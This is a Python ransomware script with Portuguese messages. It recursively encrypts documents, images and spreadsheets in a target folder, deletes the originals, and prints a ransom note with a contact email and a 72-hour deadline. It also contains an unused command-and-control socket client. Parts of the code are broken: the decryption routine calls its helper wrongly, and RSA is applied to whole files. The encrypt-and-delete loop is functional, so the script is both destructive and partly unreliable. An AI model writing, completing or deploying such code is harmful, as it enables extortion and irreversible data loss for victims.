import os
import sys
import hashlib
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from threading import Thread
import socket

class CCServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def connect(self):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((self.ip, self.port))
            return client
        except Exception as e:
            print(f"Erro na conexão com C&C: {e}")
            return None

    def receive(self, client):
        while True:
            data = client.recv(1024).decode()
            if not data:
                break
            yield data

    def send(self, client, data):
        client.sendall(data.encode())

    def send_encrypted_data(self, client, data, key):
        aes_cipher = AES.new(key, AES.MODE_CBC)
        encrypted_data = aes_cipher.encrypt(pad(data.encode(), AES.block_size))
        client.sendall(aes_cipher.iv + encrypted_data)

    def run(self):
        client = self.connect()
        if client:
            print("Conectado ao servidor C&C.")
            for data in self.receive(client):
                print(f"Recebeu dados do C&C: {data}")
                # Processar dados e interagir com o C&C
            client.close()

def generate_aes_key():
    return os.urandom(32)  # Chave AES de 256 bits

def generate_rsa_keypair():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

def encrypt_file_aes(file_path, key):
    with open(file_path, 'rb') as infile:
        data = infile.read()
    aes_cipher = AES.new(key, AES.MODE_CBC)
    encrypted_data = aes_cipher.encrypt(pad(data, AES.block_size))
    return aes_cipher.iv, encrypted_data

def decrypt_file_aes(file_path, key, iv):
    with open(file_path, 'rb') as infile:
        encrypted_data = infile.read()
    aes_cipher = AES.new(key, AES.MODE_CBC, iv=iv)
    decrypted_data = unpad(aes_cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data

def encrypt_file_rsa(file_path, public_key):
    with open(file_path, 'rb') as infile:
        data = infile.read()
    rsa_key = RSA.import_key(public_key)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    encrypted_data = rsa_cipher.encrypt(data)
    return encrypted_data

def decrypt_file_rsa(file_path, private_key):
    with open(file_path, 'rb') as infile:
        encrypted_data = infile.read()
    rsa_key = RSA.import_key(private_key)
    rsa_cipher = PKCS1_OAEP.new(rsa_key)
    decrypted_data = rsa_cipher.decrypt(encrypted_data)
    return decrypted_data

def show_ransomware_message():
    print("Seus dados foram criptografados! Para recuperá-los, siga as instruções abaixo:")
    print("1. Envia o ID do pagamento e o número de transação para nosso endereço de e-mail: ransomware@spam.com")
    print("2. Receba a chave de descriptografia")
    print("3. Descriptografe os arquivos e salve-os em um novo local")
    print("ATENÇÃO: O tempo para descriptografia expira em 72 horas! Ajude-nos a evitar a polícia e não configure a chave manualmente!")

def decrypt_files(folder_path, aes_key, rsa_private_key):
    for foldername, subfolders, filenames in os.walk(folder_path):
        for filename in filenames:
            if filename.endswith(".enc"):
                file_path = os.path.join(foldername, filename)
                if filename.endswith(".aes.enc"):
                    iv, encrypted_data = decrypt_file_aes(file_path, aes_key)
                    decrypted_data = unpad(encrypted_data, AES.block_size)
                    new_file_path = os.path.splitext(file_path)[0] + ".dec"
                    with open(new_file_path, 'wb') as outfile:
                        outfile.write(decrypted_data)
                elif filename.endswith(".rsa.enc"):
                    decrypted_data = decrypt_file_rsa(file_path, rsa_private_key)
                    new_file_path = os.path.splitext(file_path)[0] + ".dec"
                    with open(new_file_path, 'wb') as outfile:
                        outfile.write(decrypted_data)
                os.remove(file_path)
                print(f"Arquivo {filename} descriptografado com sucesso.")
    print("Todos os arquivos descriptografados.")

if __name__ == "__main__":
    aes_key = generate_aes_key()
    rsa_private_key, rsa_public_key = generate_rsa_keypair()

    # Criptografar arquivos com AES
    folder_path = sys.argv[1] if len(sys.argv) > 1 else "."
    for foldername, _, filenames in os.walk(folder_path):
        for filename in filenames:
            if filename.endswith((".txt", ".doc", ".jpg", ".jpeg", ".png", ".csv", ".xls", ".xlsx")):
                file_path = os.path.join(foldername, filename)
                if file_path.endswith((".txt", ".doc", ".jpg", ".jpeg", ".png")):
                    iv, encrypted_data = encrypt_file_aes(file_path, aes_key)
                    new_file_path = os.path.splitext(file_path)[0] + ".aes.enc"
                    with open(new_file_path, 'wb') as outfile:
                        outfile.write(iv + encrypted_data)
                elif file_path.endswith((".csv", ".xls", ".xlsx")):
                    encrypted_data = encrypt_file_rsa(file_path, rsa_public_key)
                    new_file_path = os.path.splitext(file_path)[0] + ".rsa.enc"
                    with open(new_file_path, 'wb') as outfile:
                        outfile.write(encrypted_data)
                os.remove(file_path)
                print(f"Arquivo {filename} criptografado com sucesso.")

    show_ransomware_message()
    decrypt_files(folder_path, aes_key, rsa_private_key)
